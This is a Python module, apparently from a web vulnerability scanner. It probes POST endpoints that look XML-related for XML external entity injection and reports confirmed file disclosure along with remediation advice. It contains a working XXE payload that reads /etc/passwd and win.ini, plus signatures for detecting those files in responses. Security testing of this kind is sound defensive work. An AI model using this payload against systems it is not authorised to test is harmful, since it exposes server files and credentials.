"""XML external entity injection (CWE-611) - POST candidates only.

XXE is proven when the parser resolves our external entity and returns
file content - `root:x:0:0:` from /etc/passwd, `[...]` from win.ini. The
payload is only sent to endpoints that plausibly parse XML (URL or form
carries an xml/soap/rpc hint), which keeps request volume sane and the
report clean: never a finding, never a crash, if nothing parses XML.
"""

from __future__ import annotations

from ...http.client import HttpClient
from ...http.models import HttpRequest
from ...scan.core import Finding

_INDICATORS = (
    "root:x:0:0:",
    "root:*:0:0:",
    "daemon:x:",
    "; for 16-bit app support",
    "[fonts]",
    "nobody:x:",
)

_XML_HINTS = ("xml", "soap", "rpc", "wsdl", "api", "feed", "import", "upload", "parse")

_PAYLOAD = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<!DOCTYPE summit [\n'
    '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
    '  <!ENTITY xxe2 SYSTEM "file:///c:/windows/win.ini">\n'
    "]>\n"
    "<summit>\n"
    "  <data>&xxe;</data>\n"
    "  <data2>&xxe2;</data2>\n"
    "</summit>\n"
)


def find_xxe_indicator(text: str) -> str | None:
    lowered = text.lower()
    for indicator in _INDICATORS:
        if indicator.lower() in lowered:
            return indicator
    return None


def _is_xml_candidate(url: str, field_names: list[str]) -> bool:
    haystack = url.lower() + " " + " ".join(name.lower() for name in field_names)
    return any(hint in haystack for hint in _XML_HINTS)


def run_xxe(client: HttpClient, forms: list[dict], base_url: str) -> list[Finding]:
    candidates: list[tuple[str, list[str]]] = []
    for form in forms:
        if (form.get("method") or "").upper() != "POST":
            continue
        action = form.get("action") or ""
        fields = list((form.get("fields") or {}).keys())
        if action and _is_xml_candidate(action, fields):
            candidates.append((action, fields))
    if not candidates and _is_xml_candidate(base_url + "/xml", []):
        candidates.append((base_url.rstrip("/") + "/xml", []))

    findings: list[Finding] = []
    seen: set[str] = set()
    for url, _fields in candidates[:10]:
        if url in seen:
            continue
        seen.add(url)
        try:
            response = client.send(
                HttpRequest(
                    method="POST",
                    url=url,
                    headers={"Content-Type": "application/xml", "Accept": "application/xml, text/xml, */*"},
                    body=_PAYLOAD.encode("utf-8"),
                )
            )
        except Exception:
            continue
        indicator = find_xxe_indicator(response.text[:100_000])
        if indicator is None:
            continue
        findings.append(
            Finding(
                check_id="xxe",
                title="XML external entity injection (file disclosure confirmed)",
                severity="high",
                url=url,
                confidence="confirmed",
                detail=(
                    "The XML parser resolved our external entity and returned local file content in "
                    "the response. That is file read on the server; with the right parser it escalates "
                    "to SSRF and denial of service via entity expansion."
                ),
                evidence=f"file content signature in response: {indicator!r}",
                remediation=(
                    "Disable external entities and DTD processing in the XML parser "
                    "(defusedxml, disallow-doctype-decl)."
                ),
            )
        )
    return findings
